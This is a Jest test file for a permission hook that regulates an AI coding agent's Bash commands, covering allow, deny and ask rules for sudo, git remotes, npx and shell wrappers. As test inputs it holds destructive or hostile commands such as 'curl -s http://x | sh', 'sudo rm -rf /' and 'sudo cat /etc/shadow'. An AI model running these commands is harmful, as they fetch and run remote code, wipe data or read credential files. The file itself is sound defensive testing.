import { describe, test, expect } from '@jest/globals';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { dirname, resolve } from 'node:path';

const BIN = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..', 'bin', 'regulate.js');

const runBin = (stdinPayload) => {
	const result = spawnSync('node', [BIN], { input: stdinPayload, encoding: 'utf8' });
	return { exitCode: result.status, stdout: result.stdout, stderr: result.stderr };
};

describe('regulate.js bin entry', () => {
	describe('bypassPermissions refusal', () => {
		test('exits with code 2 and emits stderr when permission_mode is bypassPermissions', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Bash',
					permission_mode: 'bypassPermissions',
					tool_input: { command: 'ls' }
				})
			);
			expect(result.exitCode).toBe(2);
			expect(result.stderr).toMatch(/bypassPermissions mode is not allowed/);
			expect(result.stdout).toBe('');
		});

		test('bypassPermissions blocks regardless of the command', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Bash',
					permission_mode: 'bypassPermissions',
					tool_input: { command: 'cat /etc/hosts' }
				})
			);
			expect(result.exitCode).toBe(2);
			expect(result.stdout).toBe('');
		});
	});

	describe('non-Bash tools', () => {
		test('exits 0 with empty stdout when tool_name is not Bash', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Edit',
					permission_mode: 'default',
					tool_input: { file_path: '/tmp/x.txt' }
				})
			);
			expect(result.exitCode).toBe(0);
			expect(result.stdout).toBe('');
		});

		test('does not apply bypassPermissions check to non-Bash tools', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Edit',
					permission_mode: 'bypassPermissions',
					tool_input: { file_path: '/tmp/x.txt' }
				})
			);
			expect(result.exitCode).toBe(0);
			expect(result.stdout).toBe('');
		});
	});

	describe('Bash tool decision plumbing', () => {
		test('exits 0 with empty stdout when no rule matches (falls through to prompt)', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Bash',
					permission_mode: 'default',
					tool_input: { command: 'totally-unknown-binary --arg' }
				})
			);
			expect(result.exitCode).toBe(0);
			expect(result.stdout).toBe('');
		});

		test('tooComplex parser result emits deny JSON pointing at debug.js (heredoc missing close)', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Bash',
					permission_mode: 'default',
					tool_input: { command: 'cat <<EOF' }
				})
			);
			expect(result.exitCode).toBe(0);
			const parsed = JSON.parse(result.stdout);
			expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny');
			expect(parsed.hookSpecificOutput.permissionDecisionReason).toMatch(/could not be safely parsed/);
			expect(parsed.hookSpecificOutput.permissionDecisionReason).toMatch(/debug\.js/);
		});
	});

	describe('malformed input', () => {
		test('exits non-zero (not 2) with stderr message when stdin is not valid JSON', () => {
			const result = runBin('not-json');
			expect(result.exitCode).not.toBe(0);
			expect(result.exitCode).not.toBe(2);
			expect(result.stderr).toMatch(/invalid JSON on stdin/);
			expect(result.stdout).toBe('');
		});

		test('exits non-zero (not 2) with stderr message when an internal error is thrown', () => {
			const result = runBin(
				JSON.stringify({
					tool_name: 'Bash',
					permission_mode: 'default',
					tool_input: {}
				})
			);
			expect(result.exitCode).not.toBe(0);
			expect(result.exitCode).not.toBe(2);
			expect(result.stderr).toMatch(/^claude-bash-regulator: /);
			expect(result.stdout).toBe('');
		});
	});
});

const decisionOf = (stdinPayload) => {
	const cmd = { tool_name: 'Bash', permission_mode: 'default', tool_input: { command: stdinPayload } };
	const result = spawnSync('node', [BIN], { input: JSON.stringify(cmd), encoding: 'utf8' });
	if (result.stdout === '') {
		return { decision: 'no-match' };
	}
	const payload = JSON.parse(result.stdout);
	return {
		decision: payload.hookSpecificOutput.permissionDecision,
		reason: payload.hookSpecificOutput.permissionDecisionReason
	};
};

describe('line-continuation chains (backslash-newline)', () => {
	test('allows a NAME=... node <relative script> chain joined with && \\<newline>', () => {
		const command = [
			'TARGET=myenv node scripts/backfill.js --dry-run && \\',
			'echo "=== live ===" && \\',
			'TARGET=myenv node scripts/backfill.js --verify'
		].join('\n');
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('Phase 2 carry-over: awk patterns reproduced end-to-end via the bin', () => {
	describe('node absolute-path', () => {
		test('blocks node with an absolute path script', () => {
			const { decision, reason } = decisionOf('node /tmp/x.js');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/Do not run node scripts using absolute paths/);
		});

		test('blocks node with absolute path after a chained command', () => {
			expect(decisionOf('cd /tmp && node /tmp/x.js').decision).toBe('deny');
		});

		test('exempts scripts under /tmp/claude-transient/ (deny does not fire; common-allowed-commands matches node)', () => {
			expect(decisionOf('node /tmp/claude-transient/probe.js').decision).toBe('allow');
		});

		test('exempts /tmp/claude-transient/ after a chained command (cd allows + node exempt → allow)', () => {
			const result = decisionOf('cd app && node /tmp/claude-transient/foo.js arg1');
			expect(['allow', 'no-match']).toContain(result.decision);
		});

		test('does not match a binary whose name contains "node"', () => {
			expect(decisionOf('mynode /tmp/x.js').decision).toBe('no-match');
		});
	});

	describe('eslint path-form', () => {
		test('blocks eslint invoked through an absolute path', () => {
			const { decision, reason } = decisionOf('/usr/local/bin/eslint --fix src');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/Use `eslint` from \$PATH/);
		});

		test('blocks eslint invoked through node_modules/.bin', () => {
			const { decision, reason } = decisionOf('node_modules/.bin/eslint .');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/Use `eslint` from \$PATH/);
		});

		test('blocks eslint invoked through a relative ./ path', () => {
			expect(decisionOf('./eslint src').decision).toBe('deny');
		});

		test('allows eslint resolved from $PATH', () => {
			expect(decisionOf('eslint src').decision).toBe('allow');
		});

		test('allows eslint with an absolute-path file argument', () => {
			expect(decisionOf('eslint /tmp/foo.js').decision).toBe('allow');
		});

		test('does not match a cat invocation containing /eslint in an argument', () => {
			expect(decisionOf('cat /tmp/eslint.log').decision).toBe('allow');
		});
	});

	describe('prettier path-form', () => {
		test('blocks prettier invoked through an absolute path', () => {
			const { decision, reason } = decisionOf('/usr/local/bin/prettier --write src');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/Use `prettier` from \$PATH/);
		});

		test('blocks prettier invoked through node_modules/.bin', () => {
			const { decision, reason } = decisionOf('node_modules/.bin/prettier .');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/Use `prettier` from \$PATH/);
		});

		test('gives no decision to prettier resolved from $PATH, which is not on the allow-list', () => {
			expect(decisionOf('prettier --write src').decision).toBe('no-match');
		});

		test('gives no decision to prettier with an absolute-path file argument', () => {
			expect(decisionOf('prettier /tmp/foo.js').decision).toBe('no-match');
		});

		test('does not match a cat invocation containing /prettier in an argument', () => {
			expect(decisionOf('cat /tmp/prettier.log').decision).toBe('allow');
		});
	});

	describe('sass path-form', () => {
		test('blocks sass invoked through an absolute path', () => {
			const { decision, reason } = decisionOf('/opt/homebrew/bin/sass src/main.scss out.css');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/Use `sass` from \$PATH/);
		});

		test('blocks sass invoked through a relative ./ path', () => {
			expect(decisionOf('./sass a.scss b.css').decision).toBe('deny');
		});
	});

	describe('cd <dir> && <something> (segment-aware allow, no special-casing)', () => {
		test('allows cd <dir> && make (each segment evaluated independently)', () => {
			expect(decisionOf('cd src && make deploy').decision).toBe('allow');
		});

		test('allows cd <dir> && make with multiple targets', () => {
			expect(decisionOf('cd infra && make clean deploy').decision).toBe('allow');
		});

		test('allows make -C <dir>', () => {
			expect(decisionOf('make -C infra deploy').decision).toBe('allow');
		});

		test('allows plain make', () => {
			expect(decisionOf('make deploy').decision).toBe('allow');
		});

		test('allows cd <dir> chained with ls', () => {
			expect(decisionOf('cd src && ls').decision).toBe('allow');
		});
	});

	describe('npm run lint', () => {
		test('denies npm run lint and points to eslint on $PATH', () => {
			expect(decisionOf('npm run lint')).toEqual(expect.objectContaining({ decision: 'deny', reason: expect.stringContaining('eslint') }));
		});

		test('denies npm run lint with extra arguments', () => {
			expect(decisionOf('npm run lint --fix').decision).toBe('deny');
		});

		test('allows direct eslint invocation', () => {
			expect(decisionOf('eslint src').decision).toBe('allow');
		});
	});

	describe('shell comment lines (rejected — resend without comments)', () => {
		test('blocks a standalone comment line', () => {
			const { decision, reason } = decisionOf('# Find the nested module');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/resend the command without comments/i);
		});

		test('blocks a comment with no space after the hash', () => {
			expect(decisionOf('#no-space-comment').decision).toBe('deny');
		});

		test('blocks a compound command containing a comment line (merge to deny)', () => {
			const command =
				'cd /tmp/claude-transient 2>/dev/null\n# Find the nested modules\necho "=== Nested modules ==="\nls -la src 2>&1 | grep -i "module"';
			const { decision, reason } = decisionOf(command);
			expect(decision).toBe('deny');
			expect(reason).toMatch(/resend the command without comments/i);
		});

		test('does not match echo whose argument merely contains a hash', () => {
			expect(decisionOf('echo "# not a comment"').decision).toBe('allow');
		});
	});

	describe('npm install asks', () => {
		test('asks for a scoped package without version (npm-install rule, any form → ask)', () => {
			expect(decisionOf('npm install @scope/client').decision).toBe('ask');
		});

		test('asks for bare "npm install" with no args (npm-install rule)', () => {
			expect(decisionOf('npm install').decision).toBe('ask');
		});
	});

	describe('cd <dir> && git (segment-aware allow)', () => {
		test('allows cd <dir> && git status (each segment evaluated independently)', () => {
			expect(decisionOf('cd src && git status').decision).toBe('allow');
		});

		test('allows cd <dir> && git diff', () => {
			expect(decisionOf('cd app && git diff HEAD').decision).toBe('allow');
		});
	});

	describe('--testPathPattern deprecation', () => {
		test('blocks --testPathPattern flag', () => {
			const { decision, reason } = decisionOf('npm test -- --testPathPattern foo');
			expect(decision).toBe('deny');
			expect(reason).toMatch(/--testPathPattern is deprecated/);
		});

		test('blocks --testPathPattern=value form', () => {
			expect(decisionOf('jest --testPathPattern=foo').decision).toBe('deny');
		});

		test('allows --testNamePattern', () => {
			expect(decisionOf('npm test -- --testNamePattern=foo').decision).toBe('allow');
		});
	});
});

describe('Phase 2 carry-over: settings.json allow entries reproduced via the bin', () => {
	test.each([
		['cat /etc/hosts'],
		['cd /tmp'],
		['cp src dest'],
		['echo hello'],
		['find . -name "*.js"'],
		['git diff HEAD'],
		['git status'],
		['grep foo bar.txt'],
		['jest tests/foo.test.js'],
		['ls /tmp'],
		['make build'],
		['mkdir /tmp/x'],
		['npm t'],
		['npm test'],
		['rm /tmp/foo'],
		['rm -f /tmp/a.json /tmp/b.json'],
		['rm -rf /tmp/claude-transient/scratch'],
		['sed s/foo/bar/g file'],
		['touch /tmp/x'],
		['zcat foo.gz']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test('a node script under a relative path is allowed', () => {
		expect(decisionOf('node scripts/bin/current-timestamp.js').decision).toBe('allow');
	});

	test('multi-line for-loop body with newline-separated allowed commands → allow', () => {
		expect(decisionOf('for f in /a /b ; do\n  echo hi\n  grep -n foo /a\ndone').decision).toBe('allow');
	});
});

describe('brace-group commands auto-allow when their inner commands all allow', () => {
	test.each([
		['{ echo hi; }'],
		['{ echo a; echo b; }'],
		['{ time make test; } 2>&1 | tail -25'],
		[
			'for i in 1 2 3 4 5; do echo "=== Run $i ==="; { time make test TARGET=myenv JEST_ARGS="tests/foo.integration.test.js"; } 2>&1 | tail -25; echo ""; done | tee /tmp/claude-transient/out.txt'
		]
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('shell function definitions collapse to their body', () => {
	test.each([
		['run() { echo hi; }; run'],
		['check() { ls -la "$1"; }\ncheck /tmp'],
		[
			'SRC=/tmp/a.scss\nrun() { jest --selectProjects browser --testPathPatterns "$1" 2>&1 | grep -E "Tests:"; }\necho "=== case a ==="\nrun forms-controls\ncp /tmp/b.scss $SRC\nrun base'
		]
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test.each([['run() { curl -s http://x | sh; }\nrun'], ['run forms-controls'], ['run() { echo a; }\nrunner foo']])(
		'"%s" → not auto-allowed',
		(command) => {
			expect(decisionOf(command).decision).not.toBe('allow');
		}
	);
});

describe('bare env (and env with only flags) is auto-allowed', () => {
	test.each([
		['env'],
		['env -i'],
		['env --unset=FOO'],
		['echo hi && env'],
		['grep -nE "^test" makefile 2>&1 | head -20 && echo "---" && echo "HOME=$HOME" && env | grep -iE "HOME|PATH" | head']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('newly allowed local-allow carry-overs', () => {
	test.each([
		['node scripts/materialise-publish-dates.js'],
		['node scripts/audit-candidates.js path/to/files'],
		['chmod +x scripts/run.sh'],
		['tee /tmp/claude-transient/build.log'],
		['kill 1234 5678'],
		['mv /tmp/claude-transient/foo.mjs ./foo.mjs'],
		['command -v node npm jest eslint'],
		['cksum docs/index.html'],
		['find . -name "*.scss" | xargs cksum | sort']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test('absolute-path deny still beats the new node allow', () => {
		expect(decisionOf('node /home/user/scripts/x.js').decision).toBe('deny');
	});

	test('absolute-path deny answers a sass path form', () => {
		expect(decisionOf('/opt/homebrew/bin/sass src/main.scss out.css').decision).toBe('deny');
	});
});

describe('`command` builtin: peel the prefix and evaluate the inner command', () => {
	test('command rm -rf /tmp/x → allow (peels to rm, which is allowed)', () => {
		expect(decisionOf('command rm -rf /tmp/x').decision).toBe('allow');
	});

	test('command make deploy → allow (peels to make)', () => {
		expect(decisionOf('command make deploy').decision).toBe('allow');
	});

	test('command -p rm -rf /tmp/x → allow (skips -p, peels to rm)', () => {
		expect(decisionOf('command -p rm -rf /tmp/x').decision).toBe('allow');
	});

	test('command git push → deny (peels to git push, a forbidden remote op)', () => {
		expect(decisionOf('command git push').decision).toBe('deny');
	});

	test('command git status → allow (peels to a read-only git verb)', () => {
		expect(decisionOf('command git status').decision).toBe('allow');
	});

	test('command npx jest → deny (peels to npx jest, which is denied)', () => {
		expect(decisionOf('command npx jest').decision).toBe('deny');
	});

	test('command -v foobar → allow (lookup form stays always-allowed, like which)', () => {
		expect(decisionOf('command -v foobar').decision).toBe('allow');
	});
});

describe('local-allow carry-overs: jq', () => {
	test.each([
		["jq -r '.tool_input.file_path' /tmp/event.json"],
		['cat package.json | jq .scripts']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('git read-only verbs auto-allow; mutating verbs require ask', () => {
	test.each([
		['git log --oneline -10'],
		['git log --oneline -10 tests/foo.integration.test.js'],
		['git blame tests/foo.integration.test.js'],
		['git diff'],
		['git status'],
		['git stash list'],
		['git stash show'],
		['git stash show -p stash@{0}'],
		['git --no-pager stash list'],
		['git archive --format=tar HEAD'],
		['git ls-files docs/styles/auth.scss'],
		['git ls-files --error-unmatch src/read-page.js'],
		['git -C /tmp/repo ls-files'],
		['git check-ignore -v docs/styles/auth.css'],
		['git --no-pager check-ignore --no-index docs/assets/logo']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test.each([
		['git add .'],
		['git add plans/a-plan.md'],
		['git commit -m foo'],
		['git checkout master'],
		['git stash'],
		['git stash push -m wip'],
		['git stash pop'],
		['git revert HEAD']
	])('"%s" → ask (local-state mutation must be confirmed)', (command) => {
		expect(decisionOf(command).decision).toBe('ask');
	});

	test('compound eslint pipeline with git stash list + git diff → allow', () => {
		const command =
			'eslint src/user-management.js 2>&1 | grep -E "error" | head; echo "ERRORS ABOVE (none = clean)"; git stash list 2>/dev/null; git diff --stat src/user-management.js';
		expect(decisionOf(command).decision).toBe('allow');
	});

	test.each([['mvn package'], ['mvn test']])('"%s" → no-match (no mvn rule; every mvn call falls through to the prompt)', (command) => {
		expect(decisionOf(command).decision).toBe('no-match');
	});
});

describe('git readonly subcommands tolerate -C, -c and --no-pager global options', () => {
	test.each([
		['git -C /srv/project status'],
		['git -C /tmp status --porcelain plans/x.md'],
		['git -C /path -c key=value diff'],
		['git -c color.ui=never status'],
		['git -C /srv/project log --oneline -10 tests/foo.integration.test.js'],
		['git --no-pager status'],
		['git --no-pager diff src/a-module.js'],
		['git -C /path --no-pager log --oneline']
	])('"%s" → allow', (command) => {
		expect(decisionOf(command).decision).toBe('allow');
	});

	test.each([['git -c user.email=foo@bar.com commit -m msg'], ['git -C ../repo checkout master'], ['git --no-pager stash']])(
		'"%s" → ask (global options do not bypass the mutating-verb ask rule)',
		(command) => {
			expect(decisionOf(command).decision).toBe('ask');
		}
	);

	test('git --no-pager push origin master → deny (--no-pager does not bypass gitRemoteRule)', () => {
		const { decision, reason } = decisionOf('git --no-pager push origin master');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Ask the user to run `git --no-pager push origin master` directly/);
	});

	test('git -C /path push origin master → deny (global option does not bypass gitRemoteRule)', () => {
		const { decision, reason } = decisionOf('git -C /path push origin master');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Ask the user to run `git -C \/path push origin master` directly/);
	});

	test('git -c user.email=foo@bar.com pull → deny', () => {
		expect(decisionOf('git -c user.email=foo@bar.com pull').decision).toBe('deny');
	});

	test('git -C without path argument → no-match', () => {
		expect(decisionOf('git -C status').decision).toBe('no-match');
	});

	test('git --exec-path=/x status → no-match (only -C, -c and --no-pager are tolerated)', () => {
		expect(decisionOf('git --exec-path=/x status').decision).toBe('no-match');
	});
});

describe('export for setting env vars is denied (use the NAME=VALUE command prefix instead)', () => {
	test('blocks export NAME=VALUE', () => {
		const { decision, reason } = decisionOf('export FOO=bar');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Prefix the command with NAME=VALUE pairs/);
	});

	test('blocks export with multiple NAME=VALUE pairs', () => {
		expect(decisionOf('export FOO=bar BAZ=qux').decision).toBe('deny');
	});

	test('blocks export NAME=VALUE in a compound command (merge to deny)', () => {
		expect(decisionOf('export FOO=bar && make test').decision).toBe('deny');
	});

	test('still allows the NAME=VALUE command prefix form', () => {
		expect(decisionOf('FOO=bar make test').decision).toBe('allow');
	});

	test('does not deny export -p (listing exports, not setting a value)', () => {
		expect(decisionOf('export -p').decision).toBe('no-match');
	});
});

describe('Phase 3: npm install always asks', () => {
	test('bare "npm install" → ask', () => {
		expect(decisionOf('npm install').decision).toBe('ask');
	});

	test('"npm install jest" → ask', () => {
		expect(decisionOf('npm install jest').decision).toBe('ask');
	});

	test('"npm install --no-audit" → ask', () => {
		expect(decisionOf('npm install --no-audit').decision).toBe('ask');
	});
});

describe('Phase 3: jest path-form deny', () => {
	test('../../node_modules/.bin/jest tests/foo.test.js → deny', () => {
		const { decision, reason } = decisionOf('../../node_modules/.bin/jest tests/foo.test.js');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Use `jest` from \$PATH/);
	});

	test('bare jest tests/foo.test.js → allow (path-form rule does not fire)', () => {
		expect(decisionOf('jest tests/foo.test.js').decision).toBe('allow');
	});
});

describe('Phase 3: npx generic deny + npx jest specific deny', () => {
	test('npx prettier → deny with generic npx message', () => {
		const { decision, reason } = decisionOf('npx prettier --write .');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Project policy forbids `npx`/);
	});

	test('npx jest → deny with jest-redirect message', () => {
		const { decision, reason } = decisionOf('npx jest');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Use the `jest` binary from \$PATH/);
	});

	test('npx -y jest → deny with jest-redirect message', () => {
		const { decision, reason } = decisionOf('npx -y jest --listTests');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Use the `jest` binary from \$PATH/);
	});

	test('time npx jest → deny with jest-redirect (wrapper unwrapped, then npx-jest match)', () => {
		const { decision, reason } = decisionOf('time npx jest');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Use the `jest` binary from \$PATH/);
	});

	test('cd src && npx prettier . → deny (compound merge)', () => {
		expect(decisionOf('cd src && npx prettier .').decision).toBe('deny');
	});
});

describe('timeout wrapper unwrapping', () => {
	test('timeout 400 jest foo.test.js → allow (inner jest re-evaluated)', () => {
		expect(decisionOf('timeout 400 jest tests/foo/bar.test.js --silent').decision).toBe('allow');
	});

	test('timeout 30s make test → allow', () => {
		expect(decisionOf('timeout 30s make test').decision).toBe('allow');
	});

	test('timeout 5 git push → deny (wrapper does not bypass the git remote deny)', () => {
		expect(decisionOf('timeout 5 git push').decision).toBe('deny');
	});

	test('timeout 5 sudo make deploy → deny (wrapper does not bypass the sudo deny)', () => {
		expect(decisionOf('timeout 5 sudo make deploy').decision).toBe('deny');
	});

	test('timeout 30s npx jest → deny (inner npx-jest deny propagates)', () => {
		const { decision, reason } = decisionOf('timeout 30s npx jest');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Use the `jest` binary from \$PATH/);
	});
});

describe('Phase 3: git remote-operation deny with verbatim command', () => {
	test('git push origin master --force → deny with the original command interpolated', () => {
		const { decision, reason } = decisionOf('git push origin master --force');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Ask the user to run `git push origin master --force` directly/);
	});

	test('git pull → deny', () => {
		expect(decisionOf('git pull').decision).toBe('deny');
	});

	test('git fetch --all --tags → deny', () => {
		expect(decisionOf('git fetch --all --tags').decision).toBe('deny');
	});

	test('git clone <url> → deny', () => {
		expect(decisionOf('git clone https://github.com/foo/bar').decision).toBe('deny');
	});

	test('git diff origin/main..HEAD → allow (remote refspec does not transform diff into a remote op)', () => {
		expect(decisionOf('git diff origin/main..HEAD').decision).toBe('allow');
	});
});

describe('Phase 3: sudo hard deny', () => {
	test('sudo make deploy → deny with verbatim command', () => {
		const { decision, reason } = decisionOf('sudo make deploy');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Ask the user to run `sudo make deploy` directly/);
	});

	test('xargs sudo cmd → deny (wrapper unwrap then sudo match)', () => {
		expect(decisionOf('xargs sudo cmd').decision).toBe('deny');
	});

	test('cd /tmp && sudo cat /etc/shadow → deny (compound merge)', () => {
		expect(decisionOf('cd /tmp && sudo cat /etc/shadow').decision).toBe('deny');
	});

	test('which sudo → allow (first token is which, which is allowed; sudo only blocked when it IS the command)', () => {
		expect(decisionOf('which sudo').decision).toBe('allow');
	});

	test('echo sudo → allow', () => {
		expect(decisionOf('echo sudo').decision).toBe('allow');
	});
});

describe('heredoc end-to-end propagation', () => {
	test('cat <<EOF\\nfoo\\nEOF → allow (cat allow rule matches stripped segment)', () => {
		expect(decisionOf('cat <<EOF\nfoo\nEOF').decision).toBe('allow');
	});

	test('cat <<END\\nbody\\nEND (alternative delimiter) → allow', () => {
		expect(decisionOf('cat <<END\nbody\nEND').decision).toBe('allow');
	});

	test('cat <<EOF\\n$(echo hi)\\nEOF → allow (inner echo is on the allow list)', () => {
		expect(decisionOf('cat <<EOF\n$(echo hi)\nEOF').decision).toBe('allow');
	});

	test('cat <<EOF\\n$(date)\\nEOF → allow (both cat and date are on the allow list)', () => {
		expect(decisionOf('cat <<EOF\n$(date)\nEOF').decision).toBe('allow');
	});

	test('cat <<EOF\\n$(htop)\\nEOF → no-match (inner htop has no allow rule; compound downgrades)', () => {
		const result = decisionOf('cat <<EOF\n$(htop)\nEOF');
		expect(result.decision).toBe('no-match');
		expect(result.decision).not.toBe('allow');
	});

	test('cat <<EOF\\n$(npx prettier)\\nEOF → deny with generic npx message', () => {
		const { decision, reason } = decisionOf('cat <<EOF\n$(npx prettier)\nEOF');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/Project policy forbids `npx`/);
	});

	test(`cat <<'EOF'\\nfoo\\nEOF (single-quoted) → allow (body opaque, cat is on allow list)`, () => {
		expect(decisionOf(`cat <<'EOF'\nfoo\nEOF`).decision).toBe('allow');
	});

	test('cat <<"EOF"\\nfoo\\nEOF (double-quoted) → allow', () => {
		expect(decisionOf('cat <<"EOF"\nfoo\nEOF').decision).toBe('allow');
	});

	test('cat <<\\\\EOF\\nfoo\\nEOF (backslash-quoted) → allow', () => {
		expect(decisionOf('cat <<\\EOF\nfoo\nEOF').decision).toBe('allow');
	});

	test(`cat <<'EOF'\\n$(rm -rf /)\\nEOF → allow (quoted body is literal, $() never executes)`, () => {
		expect(decisionOf(`cat <<'EOF'\n$(rm -rf /)\nEOF`).decision).toBe('allow');
	});

	test('cat <<-EOF\\nfoo\\nEOF (tab-strip, deferred) → deny', () => {
		const { decision, reason } = decisionOf('cat <<-EOF\nfoo\nEOF');
		expect(decision).toBe('deny');
		expect(reason).toMatch(/could not be safely parsed/);
		expect(reason).toMatch(/debug\.js/);
	});

	test('cat <<EOF (no close, malformed) → deny', () => {
		expect(decisionOf('cat <<EOF').decision).toBe('deny');
	});

	test('echo before && cat <<EOF\\nbody\\nEOF → allow (compound of two allow-listed segments)', () => {
		expect(decisionOf('echo before && cat <<EOF\nbody\nEOF').decision).toBe('allow');
	});
});

describe('sh -c inner-script regulation', () => {
	test(`sh -c 'npm test' → allow (inner script segments carry the decision)`, () => {
		expect(decisionOf(`sh -c 'npm test'`).decision).toBe('allow');
	});

	test(`grep pipeline into xargs -I{} sh -c '...' → allow (wrapper-prefixed shell script re-parsed)`, () => {
		const command = `grep -rln "sign-in-card" /tmp/site --include="*.css" 2>/dev/null | head; echo ---; grep -rl "sign-in-card" /tmp/site 2>/dev/null | grep css | head -3 | xargs -I{} sh -c 'echo {}; grep -o "sign-in-card{margin[^;]*" "{}" | head -2'`;
		expect(decisionOf(command).decision).toBe('allow');
	});

	test(`sh -c 'htop' → no-match (inner command not on the allow list)`, () => {
		expect(decisionOf(`sh -c 'htop'`).decision).toBe('no-match');
	});

	test(`bash -c 'npx prettier' → deny (inner npx deny propagates)`, () => {
		expect(decisionOf(`bash -c 'npx prettier'`).decision).toBe('deny');
	});

	test('echo a | xargs sh -c → no-match (script arrives via stdin, opaque to the regulator)', () => {
		expect(decisionOf('echo a | xargs sh -c').decision).toBe('no-match');
	});
});

describe('xargs -I replstr space-form unwraps to the inner command', () => {
	test('find ... | xargs -I {} basename {} → allow (replstr argument consumed, basename matches)', () => {
		const command = `find /tmp -name "*.html" -type f | xargs -I {} basename {}`;
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('subshell parens propagate through to per-segment evaluation', () => {
	test('cd && (git diff; echo b) | xargs grep ... → allow (all inner segments are on the allow list)', () => {
		const command = `cd /tmp && (git diff HEAD --name-only -- '*test*'; echo b) | xargs grep -lE "Gap [0-9]" 2>/dev/null`;
		expect(decisionOf(command).decision).toBe('allow');
	});

	test('(echo a; echo b) → allow', () => {
		expect(decisionOf('(echo a; echo b)').decision).toBe('allow');
	});

	test('(sudo rm -rf /) → deny (sudo rule fires inside the subshell)', () => {
		expect(decisionOf('(sudo rm -rf /)').decision).toBe('deny');
	});
});

describe('env-assignment substitution recursion (regression: for-loop with var=$(grep|sed) and var=$(basename))', () => {
	test('var=$(grep ...) → allow because grep is on the allow list', () => {
		expect(decisionOf('exports=$(grep foo bar)').decision).toBe('allow');
	});

	test('var=$(grep ... | sed ...) → allow because both grep and sed are on the allow list', () => {
		expect(decisionOf('out=$(grep foo file | sed s/a/b/)').decision).toBe('allow');
	});

	test('var=$(sudo rm -rf /) → deny because the substitution body matches the sudo deny rule', () => {
		expect(decisionOf('out=$(sudo rm -rf /)').decision).toBe('deny');
	});

	test('the exact for-loop command that originally required permission resolves to allow', () => {
		const command =
			'for f in src/strategies/*.js; do\n' +
			'  exports=$(grep -E "^export (const|function|class) " "$f" | sed -E \'s/^export (const|function|class) ([A-Za-z_$][A-Za-z0-9_$]*).*/\\2/\')\n' +
			'  base=$(basename "$f" .js)\n' +
			'  echo "$base.js → $exports"\n' +
			'done';
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('process-control utilities on the common allow list', () => {
	test('pkill -f <pattern> → allow (sibling of kill/pgrep)', () => {
		expect(decisionOf('pkill -f "make test"').decision).toBe('allow');
	});

	test('sleep <n> → allow (benign no-op)', () => {
		expect(decisionOf('sleep 2').decision).toBe('allow');
	});

	test('the kill-then-poll chain resolves to allow', () => {
		const command =
			'pkill -f "make.*serve"; pkill -f "jest.*watch"; sleep 2; ' +
			'echo "killed"; ps -ef 2>/dev/null | grep -iE "make serve|jest" | grep -v grep | head -3';
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('if/then/elif/else/fi conditionals collapse to their inner commands', () => {
	test('the [ test builtin is allowed', () => {
		expect(decisionOf('[ "$x" = "1" ]').decision).toBe('allow');
	});

	test('a simple if/then/fi with allowed commands resolves to allow', () => {
		expect(decisionOf('if [ "$x" = "1" ]; then echo yes; fi').decision).toBe('allow');
	});

	test('an if/then/else/fi with allowed commands resolves to allow', () => {
		expect(decisionOf('if grep -q foo bar; then echo a; else echo b; fi').decision).toBe('allow');
	});

	test('a deny inside an if body still denies (deny dominates the conditional)', () => {
		expect(decisionOf('if [ 1 = 1 ]; then sudo rm -rf /; fi').decision).toBe('deny');
	});
});

describe('$((arithmetic)) expansion is not treated as a command substitution', () => {
	test('an arithmetic assignment followed by an allowed command resolves to allow', () => {
		expect(decisionOf('n=$((1+2)); echo done').decision).toBe('allow');
	});

	test('arithmetic does not mask a denied command substitution', () => {
		expect(decisionOf('out=$(sudo rm -rf /)').decision).toBe('deny');
	});

	test('the queue-polling loop with conditional and arithmetic resolves to allow', () => {
		const command =
			'total=0; nonzero=0; for q in $(ls /tmp/claude-transient/queues 2>/dev/null | grep -iE "dlq|dead"); ' +
			'do total=$((total+1)); n=$(wc -l /tmp/claude-transient/queues/$q 2>/dev/null | cut -d" " -f1); ' +
			'if [ "$n" != "0" ]; then nonzero=$((nonzero+1)); ' +
			'echo "NONZERO($n): ${q##*/}"; fi; done; echo "TOTAL=$total NONZERO=$nonzero"';
		expect(decisionOf(command).decision).toBe('allow');
	});
});

describe('read-only inspection tools on the common allow list', () => {
	test.each([
		['comm -3 /tmp/a.txt /tmp/b.txt'],
		['free -m'],
		['uptime'],
		['du -sh build'],
		['df -h /tmp'],
